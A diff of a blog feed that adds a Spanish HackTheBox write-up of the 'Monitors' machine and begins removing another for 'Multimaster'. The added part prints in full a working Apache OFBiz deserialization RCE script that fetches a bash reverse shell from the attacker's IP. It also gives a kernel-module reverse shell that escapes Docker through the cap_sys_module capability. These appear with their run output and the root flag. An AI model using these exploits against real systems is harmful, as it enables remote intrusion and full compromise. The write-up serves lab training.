+Last login: Sun May 14 22:13:41 2023 from 10.10.16.3
+marcus@monitors:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Verificamos que tenemos conexion al puerto.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ lsof -i:8443
+COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+ssh     66347 root    4u  IPv6 258489      0t0  TCP localhost:8443 (LISTEN)
+ssh     66347 root    5u  IPv4 258490      0t0  TCP localhost:8443 (LISTEN)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Veamos el servicio desde nuestro navegador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos arroja el codigo de estado &lt;code&gt;404 not found&lt;/code&gt;. Ahora trataremos con &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://127.0.0.1:8443/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://127.0.0.1:8443/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000000016:   302        0 L      0 W        0 Ch        &quot;images&quot;                                                                                                              
+000000075:   302        0 L      0 W        0 Ch        &quot;content&quot;                                                                                                             
+000000152:   302        0 L      0 W        0 Ch        &quot;common&quot;                                                                                                              
+000000242:   302        0 L      0 W        0 Ch        &quot;catalog&quot;                                                                                                             
+000000564:   302        0 L      0 W        0 Ch        &quot;marketing&quot;                                                                                                           
+000000779:   302        0 L      0 W        0 Ch        &quot;ecommerce&quot;                                                                                                           
+000000920:   302        0 L      0 W        0 Ch        &quot;ap&quot;                                                                                                                  
+000001128:   302        0 L      0 W        0 Ch        &quot;ar&quot;                                                                                                                  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos varias rutas que nos dan un codigo de estado &lt;code&gt;302 redirect&lt;/code&gt;, y si provamos con la ruta &lt;code&gt;ecommerce&lt;/code&gt;, en el navegador vemos algo relacionado a &lt;code&gt;ofbizsetup&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como sabemos se esta usando el servicio de &lt;code&gt;apache&lt;/code&gt; asi que podemos tratar de buscar vulnerabilidades asociadas a &lt;code&gt;apacheofbiz&lt;/code&gt; y encontramos una de &lt;code&gt;RCE&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit apacheofbiz
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ApacheOfBiz 17.12.01 - Remote Command Execution (RCE)                                                                                                | java/webapps/50178.sh
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Examinamos el &lt;code&gt;exploit&lt;/code&gt; y vemos que aprovecha una vulnerabilidad de serealizacion.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;# Exploit Title: ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments
+# Date: 2021-08-04
+# Exploit Author: Álvaro Muñoz, Adrián Díaz (s4dbrd)
+# Vendor Homepage: https://ofbiz.apache.org/index.html
+# Software Link: https://archive.apache.org/dist/ofbiz/apache-ofbiz-17.12.01.zip
+# Version: 17.12.01
+# Tested on: Linux
+
+# CVE : CVE-2020-9496
+
+# Step 1: Host HTTP Service with python3 (sudo python3 -m http.server 80)
+# Step 2: Start nc listener (Recommended 8001).
+# Step 3: Run the exploit.
+
+
+url='https://127.0.0.1' # CHANGE THIS
+port=8443 # CHANGE THIS
+
+function helpPanel(){
+    echo -e &quot;\nUsage:&quot;
+    echo -e &quot;\t[-i] Attacker's IP&quot;
+    echo -e &quot;\t[-p] Attacker's Port&quot;
+    echo -e &quot;\t[-h] Show help pannel&quot;
+    exit 1
+}
+
+
+function ctrl_c(){
+    echo -e &quot;\n\n[!] Exiting...\n&quot;
+    exit 1
+}
+# Ctrl + C
+trap ctrl_c INT
+
+function webRequest(){
+    echo -e &quot;\n[*] Creating a shell file with bash\n&quot;
+    echo -e &quot;#!/bin/bash\n/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/$ip/$ncport 0&amp;gt;&amp;amp;1&quot; &amp;gt; shell.sh
+    echo -e &quot;[*] Downloading YsoSerial JAR File\n&quot;
+    wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar
+    echo -e &quot;[*] Generating a JAR payload\n&quot;
+    payload=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 &quot;wget $ip/shell.sh -O /tmp/shell.sh&quot; | base64 | tr -d &quot;\n&quot;)
+    echo -e &quot;[*] Sending malicious shell to server...\n&quot; &amp;amp;&amp;amp; sleep 0.5
+    curl -s $url:$port/webtools/control/xmlrpc -X POST -d &quot;&amp;lt;?xml version='1.0'?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;ProjectDiscovery&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;&amp;lt;struct&amp;gt;&amp;lt;member&amp;gt;&amp;lt;name&amp;gt;test&amp;lt;/name&amp;gt;&amp;lt;value&amp;gt;&amp;lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&amp;gt;$payload&amp;lt;/serializable&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/member&amp;gt;&amp;lt;/struct&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; -k  -H 'Content-Type:application/xml' &amp;amp;&amp;gt;/dev/null
+    echo -e &quot;[*] Generating a second JAR payload&quot;
+    payload2=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 &quot;bash /tmp/shell.sh&quot; | base64 | tr -d &quot;\n&quot;)
+    echo -e &quot;\n[*] Executing the payload in the server...\n&quot; &amp;amp;&amp;amp; sleep 0.5
+    curl -s $url:$port/webtools/control/xmlrpc -X POST -d &quot;&amp;lt;?xml version='1.0'?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;ProjectDiscovery&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;&amp;lt;struct&amp;gt;&amp;lt;member&amp;gt;&amp;lt;name&amp;gt;test&amp;lt;/name&amp;gt;&amp;lt;value&amp;gt;&amp;lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&amp;gt;$payload2&amp;lt;/serializable&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/member&amp;gt;&amp;lt;/struct&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; -k  -H 'Content-Type:application/xml' &amp;amp;&amp;gt;/dev/null
+    echo -e &quot;\n[*]Deleting Files...&quot;
+    rm ysoserial-master-d367e379d9-1.jar &amp;amp;&amp;amp; rm shell.sh
+}
+
+declare -i parameter_enable=0; while getopts &quot;:i:p:h:&quot; arg; do
+    case $arg in
+        i) ip=$OPTARG; let parameter_enable+=1;;
+        p) ncport=$OPTARG; let parameter_enable+=1;;
+        h) helpPanel;;
+    esac
+done
+
+if [ $parameter_enable -ne 2 ]; then
+    helpPanel
+else
+    webRequest
+fi
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ejecutamos el &lt;code&gt;exploit&lt;/code&gt; nos pide como parametros nuestra ip de atacante y un puerto especifico.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ bash ofbiz.sh
+
+Usage:
+	[-i] Attacker's IP
+	[-p] Attacker's Port
+	[-h] Show help pannel
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos compartimos un servicio web con &lt;code&gt;python3&lt;/code&gt; ya que el &lt;code&gt;exploit&lt;/code&gt; hara una petición a nuestra maquina solicitando un archivo de nombre &lt;code&gt;shell.sh&lt;/code&gt; el cual previamente creara y con el cual nos devolvera una conexion al puerto que le especificamos. Seguidamente nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt; y lanzamos el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ bash ofbiz.sh -i 10.10.16.3 -p 443
+
+[*] Creating a shell file with bash
+
+[*] Downloading YsoSerial JAR File
+
+[*] Generating a JAR payload
+
+[*] Sending malicious shell to server...
+
+[*] Generating a second JAR payload
+
+[*] Executing the payload in the server...
+
+
+[*]Deleting Files...
+❯ cat ofbiz.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Recibimos la petición.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.238 - - [14/May/2023 22:43:38] &quot;GET /shell.sh HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;y ganamos acceso, pero a un contenedor.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.238.
+Ncat: Connection from 10.10.10.238:40592.
+bash: cannot set terminal process group (32): Inappropriate ioctl for device
+bash: no job control in this shell
+root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01# whoami
+whoami
+root
+root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01# hostname -I
+hostname -I
+172.17.0.2 
+root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Haremos el mismo proceso anterior para obtener una &lt;code&gt;tty full interactive&lt;/code&gt;. Lo siguiente que haremos sera descargarnos el &lt;code&gt;linpeas.sh&lt;/code&gt; del repositorio de &lt;code&gt;carlospolop&lt;/code&gt; y subirlo al contenedor para buscar formas potenciales de elevar nuestro privilegio.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# wget http://10.10.16.3/linpeas.sh
+--2023-05-14 22:54:08--  http://10.10.16.3/linpeas.sh
+Connecting to 10.10.16.3:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 835306 (816K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Le damos permiso al archivo y lo ejecutamos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# chmod +x linpeas.sh 
+root@b097fc57960e:/tmp# ./linpeas.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues de esperar a que nos haga un reconocimento, nos reporta algo potencial referente a una capability &lt;code&gt;sys_module&lt;/code&gt; con la cual podemos convertirnos en &lt;code&gt;root&lt;/code&gt; en la maquina real.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;╔══════════╣ Container Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape
+Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si quieres saber mas al respecto puedes guiarte de este articulo.&lt;/p&gt;
+
+&lt;p&gt;*&lt;a href=&quot;https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd&quot;&gt;https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo primero que debemos hacer es crear un archivo &lt;code&gt;reverse-shell.c&lt;/code&gt; con un contenido especifico, donde podemos cambiar la &lt;code&gt;ip y puerto&lt;/code&gt; en el cual deseamos recibir la conexión, en este caso yo realizare la conexión en la interface &lt;code&gt;docker&lt;/code&gt; del usuario &lt;code&gt;marcus&lt;/code&gt; la cual corresponde a la &lt;code&gt;172.17.0.1&lt;/code&gt; y en cuanto al puerto usare el que esta por defecto &lt;code&gt;4444&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#include &amp;lt;linux/kmod.h&amp;gt;
+#include &amp;lt;linux/module.h&amp;gt;
+MODULE_LICENSE(&quot;GPL&quot;);
+MODULE_AUTHOR(&quot;AttackDefense&quot;);
+MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);
+MODULE_VERSION(&quot;1.0&quot;);
+char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.1/4444 0&amp;gt;&amp;amp;1&quot;, NULL};
+static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;, NULL };
+static int __init reverse_shell_init(void) {
+return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+static void __exit reverse_shell_exit(void) {
+printk(KERN_INFO &quot;Exiting\n&quot;);
+}
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Seguidamente crearemos un archivo &lt;code&gt;makefile&lt;/code&gt; con otro contenido especifico.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;obj-m +=reverse-shell.o
+all:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues ejecutaremos un &lt;code&gt;make&lt;/code&gt; para compilarlo, este nos creara un archivo &lt;code&gt;.ko&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# make
+make -C /lib/modules/4.15.0-151-generic/build M=/tmp modules
+make[1]: Entering directory '/usr/src/linux-headers-4.15.0-151-generic'
+  CC [M]  /tmp/reverse-shell.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /tmp/reverse-shell.mod.o
+  LD [M]  /tmp/reverse-shell.ko
+make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-151-generic'
+root@b097fc57960e:/tmp# ls
+Makefile		      gradle2795579439185181258.bin  gradle6644211106987001499.bin  gradle9039635524913268865.bin  hsperfdata_root  reverse-shell.ko	 shell.sh
+Module.symvers		      gradle2983053951583899525.bin  gradle7006611085073049553.bin  gradle9084471384540617701.bin  linpeas.sh	    reverse-shell.mod.c
+gradle1338051207622881975.bin  gradle3783653524079408204.bin  gradle7211342044412775236.bin  gradle9170701421662864177.bin  modules.order    reverse-shell.mod.o
+gradle251280844494394051.bin   gradle4550055017114582402.bin  gradle8316659095765584843.bin  gradle984417515461424419.bin   reverse-shell.c  reverse-shell.o
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;finalmente debemos ponernos en escucha en el puerto especifico con &lt;code&gt;ncat&lt;/code&gt; y ejecutar el &lt;code&gt;reverse-shell.ko&lt;/code&gt; con &lt;code&gt;insmod&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# insmod reverse-shell.ko 
+root@b097fc57960e:/tmp#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;y recibimos la conexión como &lt;code&gt;root&lt;/code&gt; en la maquina real.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@monitors:~$ nc -nlvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from 10.10.10.238 36840 received!
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@monitors:/# whoami
+whoami
+root
+root@monitors:/# hostname -I
+hostname -I
+10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:29a3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo que nos queda ahora es ir al directorio personal del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; 😄.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@monitors:/# cd /root
+cd /root
+root@monitors:/root# cat root.txt
+cat root.txt
+9f3208a5ff66eb9a612aaba91ea35eae
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Sun, 14 May 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Monitors</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Monitors</guid>
+        
+        <category>Information Leaked</category>
+        
+        <category>Wordpress Plugin Explotation</category>
+        
+        <category>LFI</category>
+        
+        <category>Cacti Explotation</category>
+        
+        <category>Deserialization Attack</category>
+        
+        <category>Docker Breakout</category>
+        
+        <category>capability sysmodule</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Bastard - htb writeup</title>
@@ -8744,1328 +9552,6 @@ bash-5.0#
         <category>java deserealization</category>
         
         <category>tomcat explotation</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Multimaster - htb writeup</title>
-        <description>&lt;p&gt;Hola de nuevo el de hoy vamos a estar resolviendo la maquina &lt;code&gt;Multimaster&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Insane&lt;/code&gt;, la cosa se va a tensar :smirk:. Comenzaremos realizando la enumeracion por &lt;code&gt;smb&lt;/code&gt;, despues usaremos &lt;code&gt;wfuzz&lt;/code&gt; para enumerar caracteres por fuerza bruta para validar una inyeccion, posteriormente crearemos un script en python donde realizaremos una &lt;code&gt;sql injection&lt;/code&gt; avanzada para hacer bypass un &lt;code&gt;waf&lt;/code&gt; incorporado en la maquina, obtendremos los &lt;code&gt;RID Y SID&lt;/code&gt; de los usuarios del dominio y con ellos encontraremos unas credenciales validas que nos permitiran conectarnos al sistema, donde aprovecharemos una vulnerabilidad asociada a una version de &lt;code&gt;Visual Studio Code&lt;/code&gt; que por medio de la exposicion &lt;code&gt;debugger&lt;/code&gt; lograremos obtener &lt;code&gt;RCE&lt;/code&gt;, finalmente usaremos BoodHound donde setearemos &lt;code&gt;kerberos dont require preauthetication&lt;/code&gt; a un usuario miembro del grupo &lt;code&gt;Server Operators&lt;/code&gt; y manipulando el binPath nos convertiremos en el usuario Administrator.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Multimaster
-❯ ls
- Multimaster
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,scripts}
-}
-❯ mkt
-❯ ls
- content   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.179
-PING 10.10.10.179 (10.10.10.179) 56(84) bytes of data.
-64 bytes from 10.10.10.179: icmp_seq=1 ttl=127 time=117 ms
-
---- 10.10.10.179 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 116.535/116.535/116.535/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que recibimos respuesta y que el ttl es igual a 127 correspondiente a una maquina windowns, seguidamente procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.179 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 15:32 GMT
-Initiating SYN Stealth Scan at 15:32
-Scanning 10.10.10.179 [65535 ports]
-Discovered open port 135/tcp on 10.10.10.179
-Discovered open port 53/tcp on 10.10.10.179
-Discovered open port 445/tcp on 10.10.10.179
-Discovered open port 3389/tcp on 10.10.10.179
-Discovered open port 80/tcp on 10.10.10.179
-Discovered open port 139/tcp on 10.10.10.179
-Discovered open port 3269/tcp on 10.10.10.179
-Discovered open port 389/tcp on 10.10.10.179
-Discovered open port 9389/tcp on 10.10.10.179
-Discovered open port 49698/tcp on 10.10.10.179
-Discovered open port 49667/tcp on 10.10.10.179
-Discovered open port 3268/tcp on 10.10.10.179
-Discovered open port 49675/tcp on 10.10.10.179
-Discovered open port 49674/tcp on 10.10.10.179
-Discovered open port 49681/tcp on 10.10.10.179
-Discovered open port 88/tcp on 10.10.10.179
-Discovered open port 5985/tcp on 10.10.10.179
-Discovered open port 593/tcp on 10.10.10.179
-Discovered open port 49666/tcp on 10.10.10.179
-Discovered open port 636/tcp on 10.10.10.179
-Discovered open port 464/tcp on 10.10.10.179
-Completed SYN Stealth Scan at 15:32, 41.87s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.179
-Host is up, received user-set (0.24s latency).
-Scanned at 2023-03-31 15:32:09 GMT for 41s
-Not shown: 65514 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT      STATE SERVICE          REASON
-53/tcp    open  domain           syn-ack ttl 127
-80/tcp    open  http             syn-ack ttl 127
-88/tcp    open  kerberos-sec     syn-ack ttl 127
-135/tcp   open  msrpc            syn-ack ttl 127
-139/tcp   open  netbios-ssn      syn-ack ttl 127
-389/tcp   open  ldap             syn-ack ttl 127
-445/tcp   open  microsoft-ds     syn-ack ttl 127
-464/tcp   open  kpasswd5         syn-ack ttl 127
-593/tcp   open  http-rpc-epmap   syn-ack ttl 127
-636/tcp   open  ldapssl          syn-ack ttl 127
-3268/tcp  open  globalcatLDAP    syn-ack ttl 127
-3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
-3389/tcp  open  ms-wbt-server    syn-ack ttl 127
-5985/tcp  open  wsman            syn-ack ttl 127
-9389/tcp  open  adws             syn-ack ttl 127
-49666/tcp open  unknown          syn-ack ttl 127
-49667/tcp open  unknown          syn-ack ttl 127
-49674/tcp open  unknown          syn-ack ttl 127
-49675/tcp open  unknown          syn-ack ttl 127
-49681/tcp open  unknown          syn-ack ttl 127
-49698/tcp open  unknown          syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 41.95 seconds
-           Raw packets sent: 196589 (8.650MB) | Rcvd: 47 (2.068KB)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Podemos ver puertos interesantes que se encuentran abiertos como &lt;code&gt;135 rpc&lt;/code&gt; , &lt;code&gt;139 ldap&lt;/code&gt; , &lt;code&gt;445 smb&lt;/code&gt; , &lt;code&gt;80 http&lt;/code&gt;, 88 &lt;code&gt;Kerberos&lt;/code&gt; y &lt;code&gt;5985 winrm&lt;/code&gt;, podemos asumir que nos enfrentaremos a un entorno de directorio activo.&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49674,49675,49681,49698 10.10.10.179 -oN targets
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 15:35 GMT
-Nmap scan report for 10.10.10.179
-Host is up (0.24s latency).
-
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-80/tcp    open  http          Microsoft IIS httpd 10.0
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: MegaCorp
-| http-methods: 
-|_  Potentially risky methods: TRACE
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-31 15:42:39Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
-3389/tcp  open  ms-wbt-server Microsoft Terminal Services
-| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
-| Not valid before: 2023-03-30T15:34:28
-|_Not valid after:  2023-09-29T15:34:28
-| rdp-ntlm-info: 
